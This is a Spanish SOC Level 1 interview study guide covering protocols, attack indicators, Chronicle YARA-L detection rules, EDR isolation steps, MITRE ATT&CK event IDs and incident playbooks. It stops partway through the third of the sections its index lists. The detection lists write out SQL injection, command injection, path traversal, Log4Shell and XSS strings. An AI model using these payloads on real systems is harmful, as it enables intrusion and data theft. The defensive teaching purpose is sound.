# GUÍA MAESTRA — ENTREVISTA SOC L1 EVOLUTIO (Multicliente 24x7)

> **Objetivo**: Material de preparación intensiva, 8h de vuelo, nivel L1 con proyección a Threat Hunting / Purple Team.
> **Índice**:
> 1. Fundamentos de Redes y Seguridad
> 2. Manual Maestro de Herramientas (Chronicle, EDR, MITRE)
> 3. Cuaderno de Casos Prácticos (5 Playbooks)
> 4. Cuestionario de Autoevaluación (30 preguntas)
> 5. Multicliente y Turnos
> 6. Metodología de Investigación y Detalles Operativos (método, IPs cloud, módulo de detección)

---

## 1. FUNDAMENTOS DE REDES Y SEGURIDAD (NIVEL SOC L1)

### 1.1 Conceptos base que SIEMPRE preguntan

- **Tríada CIA**: Confidentiality, Integrity, Availability.
- **AAA**: Authentication, Authorization, Accounting.
- **Defense in Depth**: múltiples capas (perímetro → red → host → aplicación → datos).
- **Least Privilege**: mínimo privilegio necesario.
- **Zero Trust**: "never trust, always verify" — no hay red interna de confianza.

### 1.2 TCP/IP rápido

| Capa | Protocolos | Qué mirar |
|------|-----------|-----------|
| L2 Enlace | ARP, MAC | ARP spoofing, MAC flooding |
| L3 Red | IP, ICMP | Geolocalización, escaneos (ping sweep), reputación IP |
| L4 Transporte | TCP, UDP | Puertos, estado de conexión (SYN, SYN-ACK, ACK), SYN floods |
| L7 Aplicación | HTTP, DNS, SMB, LDAP, SMTP, Kerberos | Payload, user agents, queries, comandos |

**3-way handshake TCP**: `SYN → SYN-ACK → ACK`. Un SYN sin respuesta masivo = escaneo o SYN flood. Muchos RST = host filtrado o escaneo con puertos cerrados.

### 1.3 Tabla maestra de puertos

| Puerto | Protocolo | Uso legítimo | Ataques típicos |
|--------|-----------|--------------|-----------------|
| 20/21 | FTP | Transferencia archivos | Credenciales en claro, anonymous login |
| 22 | SSH | Admin Linux | Brute force, user enum, key stealing |
| 23 | Telnet | (legado) | Credenciales en claro, NUNCA debería verse |
| 25 | SMTP | Envío de correo | Spoofing, open relay, phishing outbound |
| 53 | DNS | Resolución | DNS tunneling, DGA, cache poisoning |
| 67/68 | DHCP | Asignación IP | Rogue DHCP |
| 80 | HTTP | Web | SQLi, XSS, RCE, web shells |
| 88 | Kerberos | Auth AD | Kerberoasting, AS-REP Roasting, Golden Ticket |
| 110/143 | POP3/IMAP | Correo cliente | Credenciales en claro (sin TLS) |
| 123 | NTP | Sincronización | NTP amplification (DDoS) |
| 135 | RPC | DCOM, WMI | Lateral movement (wmiexec) |
| 137-139 | NetBIOS | Legado Windows | Enumeración, SMBv1 |
| 161/162 | SNMP | Gestión dispositivos | Community strings débiles (public/private) |
| 389 | LDAP | Consulta AD | Enumeración usuarios/grupos, LDAP injection |
| 443 | HTTPS | Web cifrada | C2 cifrado, exfiltración, malware beaconing |
| 445 | SMB | Compartición archivos | EternalBlue, lateral movement, PsExec |
| 636 | LDAPS | LDAP sobre TLS | Igual que LDAP |
| 1433 | MSSQL | BBDD | SQLi, xp_cmdshell |
| 1521 | Oracle | BBDD | SQLi |
| 2049 | NFS | Compartición Linux | Exports abiertos |
| 3306 | MySQL | BBDD | SQLi |
| 3389 | RDP | Remote Desktop | Brute force, BlueKeep (CVE-2019-0708) |
| 5985/5986 | WinRM | PowerShell Remoting | Lateral movement (Invoke-Command, Evil-WinRM) |
| 5900 | VNC | Remote Desktop | Sin auth, credenciales débiles |

### 1.4 DNS — qué es y cómo se ve un ataque

**Tipos de query**: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (datos arbitrarios), PTR (reverse), NS (name server), SRV (servicio).

**Indicadores de ataque en logs DNS**:
- **Dominios con alta entropía**: `kqzn8h3xvm1p.malicious.tld` → típico DGA (malware con algoritmo de generación de dominios: Conficker, Emotet, Sality).
- **Queries TXT masivas** hacia un mismo dominio → DNS tunneling / exfiltración (DNScat2, dnsexfil).
- **Queries muy largas** (>50 chars en subdominio) → tunneling.
- **Volumen anómalo**: 1000+ queries/min desde un host.
- **Resolución a IPs privadas** desde dominios externos → DNS rebinding.
- **Fast flux**: mismo dominio resolviendo a decenas de IPs distintas en minutos → botnet.

**Log ejemplo (ataque)**:
```
host01.corp → DNS query: a7f3k9x2m.evil.com (TXT)
host01.corp → DNS query: b8g4l0y3n.evil.com (TXT)
host01.corp → DNS query: c9h5m1z4o.evil.com (TXT)
... (500 queries en 2 minutos)
```

### 1.5 HTTP/HTTPS — qué buscar

**Códigos clave**:
- `200 OK` repetidos hacia `/admin.php`, `/shell.aspx` tras 404s → descubrimiento + acceso.
- `401/403` masivos → brute force o fuzzing.
- `500` tras payload extraño → posible exploit.

**Patrones de ataque en URL/body**:
- **SQLi**: `' OR 1=1--`, `UNION SELECT`, `SLEEP(5)`, `INFORMATION_SCHEMA`, `xp_cmdshell`.
- **XSS**: `<script>`, `onerror=`, `javascript:`, `document.cookie`.
- **LFI/Path traversal**: `../../../../etc/passwd`, `..\..\..\windows\win.ini`.
- **Command injection**: `; id`, `| whoami`, `&& curl`, backticks.
- **Log4Shell**: `${jndi:ldap://...}` en User-Agent, X-Forwarded-For o cualquier header.
- **Web shells**: `cmd=`, `?password=`, acceso a `.aspx`/`.php`/`.jsp` que no debería existir.

**User-Agents sospechosos**: `sqlmap`, `nikto`, `nmap`, `curl/7.x` en tráfico que no es de API, `python-requests`, UAs vacíos.

### 1.6 SMB — compartición Windows

**Versiones**:
- **SMBv1**: VULNERABLE (WannaCry / EternalBlue). No debería existir.
- **SMBv2/v3**: actual, v3 con firma y cifrado.

**Shares por defecto**:
- `C$`, `ADMIN$`, `IPC$` → usados por admins y por atacantes (PsExec).

**Event IDs clave (Windows Security)**:
| ID | Significado |
|----|-------------|
| 4624 | Logon exitoso (Type 3 = red/SMB) |
| 4625 | Logon fallido |
| 4648 | Logon con credenciales explícitas (RunAs, Pass-the-Hash) |
| 5140 | Acceso a un share |
| 5145 | Acceso detallado a un archivo dentro del share |

**Indicadores de ataque**:
- Conexiones SMB desde workstation a workstation (no debería; workstations hablan con servidores, no entre ellas).
- Uso masivo de `ADMIN$` desde una IP no-admin.
- Creación de servicios remotos sobre SMB (PsExec: crea `PSEXESVC.exe`).

### 1.7 Kerberos — el protocolo más examinado

**Componentes**:
- **KDC** (Key Distribution Center): el Domain Controller.
- **TGT** (Ticket Granting Ticket): te lo da el AS tras autenticarte.
- **TGS** (Ticket Granting Service): ticket para un servicio concreto.

**Flujo**:
1. **AS-REQ / AS-REP**: cliente pide TGT al KDC (Event 4768).
2. **TGS-REQ / TGS-REP**: cliente pide TGS para un servicio (Event 4769).
3. **AP-REQ / AP-REP**: cliente presenta el TGS al servicio.

**Ataques y detección**:
| Ataque | Qué hace | Detección |
|--------|----------|-----------|
| **Kerberoasting** | Pide TGS para cuentas de servicio, crackea offline | Event 4769 con `Ticket Encryption = 0x17` (RC4) hacia SPNs de servicio |
| **AS-REP Roasting** | Cuentas sin preauth (DONT_REQ_PREAUTH) | Event 4768 con preauth = 0 |
| **Golden Ticket** | TGT forjado con hash de `krbtgt` | Tickets con lifetime anormal (10 años), SID anómalos, Event 4769 sin 4768 previo |
| **Silver Ticket** | TGS forjado con hash de servicio | Acceso a servicio sin TGS-REQ previo en logs |
| **Pass-the-Ticket** | Reuso de TGT/TGS robado | Mismo TGT usado desde múltiples hosts |
| **DCSync** | Simula DC para replicar hashes | Event 4662 con GUID de replicación, desde host no-DC |

**Tipos de cifrado (RFC 3961)**:
- `0x17` RC4-HMAC → débil, sospechoso en entornos modernos (posible Kerberoasting).
- `0x12` AES256-CTS-HMAC-SHA1-96 → normal moderno.
- `0x11` AES128 → normal.

### 1.8 SSH — admin Linux

**Autenticación**: password, public key, GSSAPI.
**Logs** en `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS/Fedora).

**Ejemplos de logs**:
```
# Brute force:
Failed password for invalid user admin from 185.x.x.x port 40321 ssh2
Failed password for root from 185.x.x.x port 40322 ssh2
Failed password for root from 185.x.x.x port 40323 ssh2
...
Accepted password for root from 185.x.x.x port 40450 ssh2   <- ¡comprometido!

# User enumeration (timing):
Invalid user oracle from 1.2.3.4
Invalid user postgres from 1.2.3.4
Invalid user jenkins from 1.2.3.4
```

**Indicadores**:
- Login desde IP extranjera fuera de horario.
- Login root directo (debería estar deshabilitado).
- Login exitoso tras N fallos.
- Creación de nuevas claves SSH en `~/.ssh/authorized_keys` tras login (persistencia).

---

## 2. MANUAL MAESTRO DE HERRAMIENTAS

### 2.1 GOOGLE SECOPS (CHRONICLE)

#### 2.1.1 Arquitectura y filosofía

- **Ingesta masiva**: retención de 12 meses por defecto (vs 30-90 días típicos de otros SIEM).
- **Precio no depende del volumen**: ingesta "ilimitada" por licencia.
- **Normalización a UDM**: todos los logs se convierten a un esquema común.
- **Motor de detección**: YARA-L 2.0.

#### 2.1.2 UDM (Unified Data Model) — lo que TIENES que saber

El UDM normaliza eventos en una estructura `principal → (network) → target`:

| Campo | Significado | Ejemplo |
|-------|-------------|---------|
| `metadata.event_type` | Tipo de evento | `PROCESS_LAUNCH`, `NETWORK_CONNECTION`, `USER_LOGIN`, `FILE_CREATION`, `NETWORK_DNS`, `NETWORK_HTTP`, `EMAIL_TRANSACTION` |
| `metadata.product_name` | Producto origen | `Windows Security`, `Crowdstrike Falcon`, `Palo Alto Firewall` |
| `principal.hostname` | Host origen | `WKS-001` |
| `principal.ip` | IP origen | `10.0.0.15` |
| `principal.user.userid` | Usuario | `jsmith` |
| `principal.process.file.full_path` | Proceso padre | `C:\Windows\explorer.exe` |
| `target.hostname` | Host destino | `DC01` |
| `target.ip` | IP destino | `185.x.x.x` |
| `target.process.file.full_path` | Proceso ejecutado | `C:\Windows\System32\cmd.exe` |
| `target.process.command_line` | Línea de comandos | `cmd.exe /c whoami` |
| `target.file.full_path` | Archivo tocado | `C:\Users\...\malware.exe` |
| `target.file.sha256` | Hash | `abc123...` |
| `network.direction` | Dirección | `INBOUND` / `OUTBOUND` |
| `network.protocol` | L4 | `TCP`, `UDP` |
| `network.http.method` | Método HTTP | `GET`, `POST` |
| `network.http.response_code` | Código HTTP | `200`, `404` |
| `network.dns.questions.name` | Query DNS | `evil.com` |
| `security_result.action` | Acción | `ALLOW`, `BLOCK` |
| `security_result.severity` | Severidad | `HIGH`, `MEDIUM`, `LOW` |

#### 2.1.3 Tipos de búsqueda

1. **UDM Search** (estructurada):
```
metadata.event_type = "PROCESS_LAUNCH"
target.process.file.full_path = /powershell\.exe/ nocase
target.process.command_line = /-enc|-encodedcommand/ nocase
```

2. **Raw Log Search**: busca strings en los logs originales. Útil cuando el parser aún no soporta un campo.

3. **Reglas YARA-L**: detecciones automáticas continuas.

#### 2.1.4 Estructura de una regla YARA-L 2.0

```
rule nombre_regla {
  meta:
    author = "SOC Evolutio"
    description = "Qué detecta"
    severity = "HIGH"
    mitre = "T1059.001"

  events:
    // Condiciones sobre eventos
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.target.process.file.full_path = /powershell\.exe/ nocase

  match:
    $host over 5m   // Ventana temporal y agrupación

  outcome:
    $count = count($e)

  condition:
    $e and $count > 5
}
```

#### 2.1.5 Ejemplo 1 — Regla Ransomware (Shadow Copy deletion)

**Técnica MITRE**: T1490 (Inhibit System Recovery). Prácticamente todo ransomware (Ryuk, Conti, LockBit, BlackCat) borra las shadow copies para impedir recuperación.

```
rule ransomware_shadow_copy_deletion {
  meta:
    author = "SOC"
    description = "Deteccion de borrado de Volume Shadow Copies"
    severity = "HIGH"
    mitre = "T1490"
    priority = "P1"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    (
      re.regex($e.target.process.file.full_path, `(?i)\\vssadmin\.exe$`) or
      re.regex($e.target.process.file.full_path, `(?i)\\wmic\.exe$`) or
      re.regex($e.target.process.file.full_path, `(?i)\\wbadmin\.exe$`)
    )
    (
      re.regex($e.target.process.command_line, `(?i)delete\s+shadows`) or
      re.regex($e.target.process.command_line, `(?i)shadowcopy\s+delete`) or
      re.regex($e.target.process.command_line, `(?i)delete\s+catalog`) or
      re.regex($e.target.process.command_line, `(?i)bcdedit.*recoveryenabled\s+no`)
    )
    $e.principal.hostname = $host

  match:
    $host over 5m

  condition:
    $e
}
```

#### 2.1.6 Ejemplo 2 — Regla Ransomware (creación masiva de archivos cifrados)

```
rule ransomware_mass_file_rename {
  meta:
    severity = "HIGH"
    mitre = "T1486"

  events:
    $e.metadata.event_type = "FILE_MODIFICATION"
    re.regex($e.target.file.full_path, `(?i)\.(locked|encrypted|crypt|ryuk|conti|lockbit|[a-z0-9]{5,10})$`)
    $e.principal.hostname = $host

  match:
    $host over 5m

  outcome:
    $file_count = count_distinct($e.target.file.full_path)

  condition:
    $file_count > 50
}
```

#### 2.1.7 Ejemplo 3 — Exfiltración vía DNS tunneling

```
rule dns_tunneling_suspect {
  meta:
    severity = "MEDIUM"
    mitre = "T1048.003"

  events:
    $dns.metadata.event_type = "NETWORK_DNS"
    $dns.network.dns.questions.name = $qname
    $dns.principal.hostname = $host

  match:
    $host over 10m

  outcome:
    $query_count = count($qname)
    $max_len = max(strings.length($qname))
    $avg_len = avg(strings.length($qname))

  condition:
    $query_count > 200 and $max_len > 50 and $avg_len > 30
}
```

#### 2.1.8 Ejemplo 4 — Exfiltración vía HTTP POST grande

```
rule http_exfiltration_large_upload {
  meta:
    severity = "MEDIUM"
    mitre = "T1041"

  events:
    $e.metadata.event_type = "NETWORK_HTTP"
    $e.network.http.method = "POST"
    $e.network.sent_bytes > 52428800   // 50 MB
    not re.regex($e.target.hostname, `(?i)(sharepoint|onedrive|googleapis|microsoft|dropbox|box\.com|drive\.google)`)

  condition:
    $e
}
```

#### 2.1.9 Ejemplo 5 — Beaconing C2 (intervalos regulares)

```
rule c2_beaconing_pattern {
  meta:
    severity = "HIGH"
    mitre = "T1071.001"

  events:
    $e.metadata.event_type = "NETWORK_CONNECTION"
    $e.principal.hostname = $host
    $e.target.ip = $dst

  match:
    $host, $dst over 1h

  outcome:
    $conn_count = count($e)
    $distinct_bytes = count_distinct($e.network.sent_bytes)

  condition:
    $conn_count > 50 and $distinct_bytes < 5    // Muchas conexiones de tamaño casi idéntico
}
```

### 2.2 COMPARATIVA EDR — CrowdStrike vs Cortex XDR vs Microsoft Defender

#### 2.2.1 Tabla comparativa

| Función | CrowdStrike Falcon | Cortex XDR (Palo Alto) | Microsoft Defender for Endpoint |
|---------|-------------------|------------------------|----------------------------------|
| **Consola** | Falcon Console | Cortex XDR | Microsoft 365 Defender portal |
| **Lenguaje de búsqueda** | Falcon Query Language (FQL), Event Search (SPL-like) | XQL (parecido a SQL) | KQL (Kusto Query Language) |
| **Process Tree** | "Process Explorer" dentro de detección | "Causality Chain" (árbol de causalidad) | "Device Timeline" y "Process Tree" |
| **Registry Changes** | Event Search tipo `RegistryEvent` | XQL sobre `xdr_data` con `event_type = REGISTRY` | `DeviceRegistryEvents` |
| **Network Connections** | `NetworkConnectIP4` | XQL sobre `xdr_data` event_type = NETWORK | `DeviceNetworkEvents` |
| **File Events** | `FileWrittenToDisk`, `FileOpenInfo` | event_type = FILE | `DeviceFileEvents` |
| **Aislamiento** | Network Containment | Isolate endpoint | Isolate device |
| **Threat Intel** | Falcon Intelligence (CrowdStrike Intel) | WildFire + AutoFocus | Microsoft Threat Intelligence |
| **Response action** | RTR (Real Time Response) — shell remoto | Live Terminal | Live Response |
| **Fortaleza** | Ligero, cloud-native, telemetría excelente, threat hunting | Correlación de eventos (causality) | Integración nativa con M365/Azure/AD, precio |

#### 2.2.2 Qué buscar en cada EDR cuando investigas un host

**Process Tree / Causality Chain — qué revisa**:
1. **Proceso padre**: ¿es legítimo? (`explorer.exe`, `services.exe`, `svchost.exe`). Rojo: `winword.exe → cmd.exe` o `outlook.exe → powershell.exe`.
2. **Línea de comandos**: ¿ofuscada? (`powershell -enc`, base64), ¿parámetros sospechosos? (`-w hidden`, `-nop`, `-ep bypass`).
3. **Hijo (proceso lanzado)**: binarios nativos usados fuera de su contexto (LOLBAS): `certutil.exe`, `bitsadmin.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `wmic.exe`.
4. **Hash del binario**: ¿conocido/firmado? Reputación en VirusTotal.
5. **Usuario que lo ejecuta**: ¿es el esperado? Ejecución como `SYSTEM` desde un correo = RCE.

**Registry Changes — qué revisa**:
- **Persistencia** (T1547.001 Run keys):
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKCU\...\RunOnce`
- **Image File Execution Options (IFEO)** → debugger hijacking.
- **Services** → `HKLM\SYSTEM\CurrentControlSet\Services\<nombre>` con binario extraño.
- **Deshabilitar defensas**: `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1`.
- **AppInit_DLLs**, **WinLogon Shell/Userinit**.

**Network Connections — qué revisa**:
- Conexiones a IPs no vistas antes en la organización.
- Puertos atípicos (8080, 4444, 8443, puertos altos aleatorios).
- Beaconing: conexiones a intervalos regulares (cada 30s, 60s, 5min).
- DNS a dominios con alta entropía o recién registrados (< 7 días).
- Conexiones desde procesos que no deberían hacer red (`notepad.exe`, `calc.exe`).

#### 2.2.3 Aislamiento de host — paso a paso

**CrowdStrike Falcon**:
1. Falcon Console → **Host setup and management** → **Host management**.
2. Buscar el host por hostname o IP.
3. Seleccionar el host → menú de acciones (⋯) → **Network Contain**.
4. Confirmar.
5. El host solo podrá comunicarse con la nube Falcon y las IPs/dominios que estén en el allowlist (se configura en *Containment Policy*).
6. Para liberar: misma pantalla → **Lift containment**.
7. **Importante**: se puede ejecutar RTR (Real Time Response) aunque esté contenido.

**Cortex XDR (Palo Alto)**:
1. Cortex XDR → **Endpoints** → **All Endpoints**.
2. Localizar el endpoint → seleccionar → **Actions** → **Endpoint Isolation** → **Isolate**.
3. El endpoint queda aislado (solo comunica con Cortex XDR y lo que esté en la *Isolation Exceptions List*).
4. Para liberar: **Actions** → **Cancel Isolation**.
5. **Live Terminal** sigue funcionando.

**Microsoft Defender for Endpoint**:
1. **security.microsoft.com** → **Assets** → **Devices**.
2. Abrir el dispositivo → panel lateral **Isolate device**.
3. Dos opciones:
   - **Full isolation**: solo permite Defender.
   - **Selective isolation**: permite Outlook, Teams, Skype for Business (útil si el usuario debe seguir comunicado).
4. Para liberar: misma pantalla → **Release from isolation**.
5. **Live Response** sigue disponible.

#### 2.2.4 Tips operativos en EDR

- **Antes de aislar** confirma con tu L2/L3 o con el cliente en entornos críticos (servidores de producción).
- Documenta **hora exacta** de contención y **motivo** (IOC, detección, orden del cliente).
- Si es un **servidor crítico** y puede tumbar servicios, considera primero bloqueo de red específico (IP C2 en firewall) antes de contención completa.
- **NO reinicies** el host comprometido hasta tener triage de memoria si hay sospecha de malware sólo-en-RAM.

### 2.3 MITRE ATT&CK — TOP 10 TÉCNICAS SOC + EVENT IDs

> Fuente de eventos: **Windows Security** + **Sysmon** (lo ideal es tener Sysmon desplegado con config tipo SwiftOnSecurity u Olaf Hartong).

| # | Táctica | Técnica | ID | Cómo se ve en logs |
|---|---------|---------|-----|-------------------|
| 1 | Initial Access / Execution | **Phishing attachment → macro** | T1566.001 + T1204.002 | Sysmon 1 (ProcessCreate): `WINWORD.EXE` o `EXCEL.EXE` como padre de `cmd.exe`/`powershell.exe`/`mshta.exe`. Sysmon 11 (FileCreate) en `%APPDATA%` |
| 2 | Execution | **PowerShell ofuscado** | T1059.001 | Sysmon 1 con línea de comandos con `-enc`, `-e`, `FromBase64String`, `IEX`, `Invoke-Expression`. EventID 4104 (PowerShell Script Block Logging) |
| 3 | Execution | **Windows Command Shell / Batch** | T1059.003 | Sysmon 1: `cmd.exe /c`, `cmd.exe /k` desde procesos no interactivos |
| 4 | Persistence | **Run keys** | T1547.001 | Sysmon 13 (RegistryValueSet) en `HKCU\...\Run` o `HKLM\...\Run`. EventID 4657 |
| 5 | Persistence | **Scheduled Task** | T1053.005 | Sysmon 1 con `schtasks.exe /create`. EventID 4698 (Scheduled task created), 4702 (updated) |
| 6 | Defense Evasion | **Impair Defenses — disable Defender** | T1562.001 | Sysmon 1: `Set-MpPreference -DisableRealtimeMonitoring $true`. EventID 5001 (Defender desactivado), 1116/1117 en Windows Defender Operational |
| 7 | Credential Access | **LSASS dumping (Mimikatz-like)** | T1003.001 | Sysmon 10 (ProcessAccess) con target `lsass.exe` y GrantedAccess `0x1410`/`0x1010`/`0x1438`. Sysmon 11 creando `lsass.dmp` |
| 8 | Lateral Movement | **SMB / Admin Shares (PsExec)** | T1021.002 | EventID 4624 Type 3 + servicio creado EventID 7045 con nombre `PSEXESVC` o random. Sysmon 1: `services.exe` lanzando binario random desde `ADMIN$` |
| 9 | Lateral Movement | **WMI / WinRM** | T1021.006 / T1047 | Sysmon 1: proceso padre `wmiprvse.exe` o `winrshost.exe` lanzando cmd/powershell. EventID 4624 Type 3 en destino |
| 10 | Impact | **Ransomware (Shadow copy deletion + mass encryption)** | T1490 + T1486 | Sysmon 1 con `vssadmin delete shadows`, `wmic shadowcopy delete`, `wbadmin delete catalog`. Sysmon 11 masivo con extensiones `.locked`/`.crypt` |

#### 2.3.1 Sysmon — los 10 Event IDs que debes memorizar

| ID | Evento | Para qué |
|----|--------|----------|
| 1 | ProcessCreate | El más usado: ver todo proceso ejecutado, con padre, hash, línea de comandos |
| 3 | NetworkConnect | Conexiones salientes (útil para C2) |
| 7 | ImageLoad | DLL loading — detecta DLL sideloading |
| 8 | CreateRemoteThread | Injection entre procesos |
| 10 | ProcessAccess | Quién abre a quién (clave para LSASS dump) |
| 11 | FileCreate | Archivos creados (dropper, ransomware, dumps) |
| 12-14 | Registry | Creación, modificación, renombrado de claves |
| 15 | FileCreateStreamHash | ADS (Alternate Data Streams) — Mark-of-the-Web, evasion |
| 17-18 | NamedPipe | Pipes (Cobalt Strike usa `\\.\pipe\status_*`) |
| 22 | DnsQuery | Queries DNS con PID y ProcessName |

#### 2.3.2 Event IDs de Windows Security críticos

| ID | Evento |
|----|--------|
| 4624 | Logon exitoso (LogonType: 2=local, 3=red/SMB, 4=batch, 5=servicio, 7=unlock, 10=RDP, 11=cached) |
| 4625 | Logon fallido |
| 4634/4647 | Logoff |
| 4648 | Logon con credenciales explícitas (RunAs, PtH) |
| 4672 | Privilegios especiales asignados a logon (admin) |
| 4688 | Proceso creado (si está activado Command-Line Auditing) |
| 4697 | Servicio instalado |
| 4698/4699/4700/4702 | Scheduled task creada/eliminada/enabled/updated |
| 4720/4722/4726 | Cuenta creada / habilitada / eliminada |
| 4728/4732/4756 | Añadido a grupo privilegiado |
| 4768 | TGT solicitado (Kerberos AS-REQ) |
| 4769 | TGS solicitado (Kerberos TGS-REQ) |
| 4771 | Preauth fallida |
| 5140 | Share accedido |
| 5145 | Acceso detallado a archivo en share |
| 7045 | Servicio instalado (System log, usado por PsExec) |

---

## 3. CUADERNO DE CASOS PRÁCTICOS (PLAYBOOKS)

> Estructura estándar para cada uno: **Alerta inicial → Investigación → Contención → Remediación → Lecciones**.

### 3.1 PLAYBOOK 1 — Phishing con adjunto malicioso

**Alerta inicial** (típica):
- Usuario reporta correo sospechoso al buzón `abuse@cliente.com`.
- O: EDR dispara detección `Office spawning child process` (T1204.002).
- O: Email gateway (Proofpoint, Mimecast, Defender for O365) marca el correo pero no lo bloquea.

**Paso 1 — Triage del correo**:
1. Extraer del email **raw/EML**: remitente (From header y `Return-Path`), IP de origen (Received headers), asunto, URLs, adjunto.
2. Verificar **SPF, DKIM, DMARC**: si fallan, probabilidad de spoofing.
3. Comprobar **display name vs dirección real** (`Juan Perez <attacker@evil.com>`).
4. Calcular **hash SHA256** del adjunto. Buscar en VirusTotal (sandbox privada si datos sensibles).
5. Detonar el adjunto en sandbox (ANY.RUN, Joe Sandbox, Hybrid Analysis) para ver comportamiento.

**Paso 2 — Investigación en el host**:
1. ¿Usuario abrió el adjunto? Revisar EDR:
   - `winword.exe` / `excel.exe` / `outlook.exe` como **padre** de `cmd.exe`, `powershell.exe`, `mshta.exe`, `rundll32.exe`, `wscript.exe`.
   - Sysmon EventID 1.
2. ¿Se descargó payload secundario? Sysmon 11 (FileCreate) en `%TEMP%`, `%APPDATA%`, `%PUBLIC%`.
3. ¿Hay persistencia creada? Sysmon 13 en claves Run, tareas programadas (4698).
4. ¿Conexiones salientes? Sysmon 3, verificar IPs/dominios en TI (VirusTotal, AbuseIPDB, AlienVault OTX).
5. ¿Hay movimiento lateral? Logons 4624 Type 3 desde este host a otros.

**Paso 3 — Búsqueda de alcance (scoping)**:
- **Mismo correo a otros buzones**: buscar en email gateway por asunto, remitente, hash adjunto.
- **Mismos IOCs en otros hosts**: hash, IP C2, dominio → buscar en Chronicle/SIEM en toda la organización.
- ¿Otros usuarios lo abrieron? → cada uno es un incidente potencial.

**Paso 4 — Contención**:
- **Correo**: purga del correo en todos los buzones (Search & Purge en Defender, similar en Proofpoint/Mimecast).
- **Host comprometido**: aislar en EDR (CrowdStrike/Cortex/Defender).
- **Credenciales**: si hay sospecha de robo (p. ej., phishing credencial a O365), **resetear contraseña del usuario + invalidar todas las sesiones** (Revoke-AzureADUserAllRefreshToken), forzar MFA.
- **Bloqueos**: añadir remitente, dominio, IP a blocklist del gateway y del firewall.

**Paso 5 — Remediación**:
- Reimaging del host si hay ejecución confirmada de malware.
- Reset de credenciales afectadas.
- Si hubo persistencia: limpiar Run keys, tareas programadas, servicios.
- Tras limpieza: monitorizar 7 días el host.

**Paso 6 — Comunicación / Ticket**:
- Avisar al cliente con: cronología, IOCs, hosts afectados, acciones tomadas, pendiente.
- Notificar a usuarios afectados (y formación anti-phishing si recurrente).

**Lecciones / mejoras**:
- Ajustar filtros del gateway.
- Crear **regla de detección** para esos IOCs y para el patrón (p. ej., `outlook.exe → powershell -enc`).
- Proponer **formación phishing** al cliente si la tasa de clic es alta.

---

### 3.2 PLAYBOOK 2 — SQL Injection contra aplicación web

**Alerta inicial**:
- WAF dispara firma SQLi (`UNION SELECT`, `sleep()`, `information_schema`).
- O: IDS de red detecta payload SQLi.
- O: 500 errors masivos en logs del web server desde una misma IP.

**Paso 1 — Confirmar ataque**:
1. Ver **request completo** en el WAF: URL, body, headers, User-Agent.
2. **User-Agent** típico de herramienta: `sqlmap/1.x`, `Mozilla/5.0 zgrab`, UA vacío.
3. Revisar si es **escaneo automatizado** (muchos payloads distintos) o **ataque dirigido** (payload específico tras mapeo).
4. Código de respuesta:
   - `200 OK` con payload → la aplicación pudo ejecutar → **probablemente vulnerable**.
   - `500` o `403` → probablemente bloqueado o error.
5. Mirar logs del web server (Apache, IIS, Nginx) para confirmar qué llegó y qué respondió.

**Paso 2 — Investigación de impacto**:
1. ¿El atacante extrajo datos? Buscar:
   - Payloads con `UNION SELECT username, password FROM users`.
   - Payloads blind con `SLEEP(5)` o `BENCHMARK()`.
   - Tamaños de respuesta anómalos (un GET normal es 10KB, una respuesta con dump es 500KB).
2. Logs de BBDD: consultas anómalas, uso de `xp_cmdshell` (MSSQL), `LOAD_FILE`, `INTO OUTFILE` (MySQL → escritura de webshell).
3. ¿Se creó una **webshell** en el servidor? Buscar archivos `.php`, `.aspx`, `.jsp` recientes en directorios web, especialmente con nombres aleatorios.
4. ¿Conexiones salientes del servidor web? Posible exfiltración.

**Paso 3 — Contención**:
- **Bloquear la IP atacante** en el WAF/firewall (OJO con falsos positivos si es un proveedor legítimo).
- Si es escaneo persistente → blocklist + alertar al SOC de otros clientes si comparten WAF.
- Si hay webshell o RCE: **aislar el servidor** en red y pasar a IR.

**Paso 4 — Remediación**:
- Patch / hotfix de la aplicación (prepared statements, ORM, validación input).
- Si se accedió a BBDD: rotar credenciales DB, revisar integridad de datos.
- Si hubo webshell: limpieza + escaneo + reimaging si comprometido.
- Si hubo robo de datos personales: valorar obligación GDPR (**72h para notificar AEPD**).

**Paso 5 — Comunicación**:
- Ticket al cliente con: detalle del payload, respuesta del WAF, impacto (confirmado/descartado), acciones.

---

### 3.3 PLAYBOOK 3 — Brute Force (RDP / SSH / O365)

**Alerta inicial**:
- SIEM: umbral de `4625` (Windows) o `Failed password` (Linux) superado: p. ej., >20 fallos en 5 min.
- O: alerta de **impossible travel** en O365 / Entra ID.
- O: **password spraying** detectado (1 password, muchos usuarios).

**Paso 1 — Clasificar tipo**:
| Patrón | Tipo |
|--------|------|
| 1 usuario, muchas contraseñas | Brute force clásico |
| Muchos usuarios, 1-2 contraseñas comunes | Password spraying |
| Diccionario de usuarios comunes (admin, root, test) | Credential stuffing / enumeración |
| Login fallido → exitoso desde misma IP | **¡Comprometido! Máxima prioridad** |

**Paso 2 — Investigación**:
1. IP origen: ¿país, proveedor, reputación (AbuseIPDB, GreyNoise)? Tor/VPN/Residential proxy?
2. ¿Ha habido algún **login exitoso (4624)** desde esa IP? CRÍTICO.
3. ¿La cuenta tiene **MFA habilitado**? En O365: revisar si MFA se bypass (p. ej., tokens de app sin MFA, legacy auth).
4. Si exitoso: ¿qué hizo la cuenta después?
   - O365: creación de reglas de reenvío de correo (exfiltración), acceso a archivos, envío de correos.
   - Windows: logon Type 10 (RDP) → ¿procesos ejecutados?
5. Horario: ¿fuera del normal del usuario? Geolocalización inusual.

**Paso 3 — Contención**:
- Bloquear IP en firewall/perímetro (si interno, en ACL).
- Si **hay compromiso**:
  - Reset password.
  - O365/Entra: **Revoke sessions** (Revoke-AzureADUserAllRefreshToken).
  - Deshabilitar temporalmente la cuenta si crítica.
  - Forzar MFA si no lo tiene.
- Bloquear rangos GeoIP fuera de la operación del cliente si aplica.

**Paso 4 — Remediación**:
- Revisar **persistencia** en la cuenta: reglas de reenvío, delegaciones, apps OAuth consentidas, claves API.
- Si RDP: desactivar RDP expuesto a internet o poner detrás de VPN/gateway.
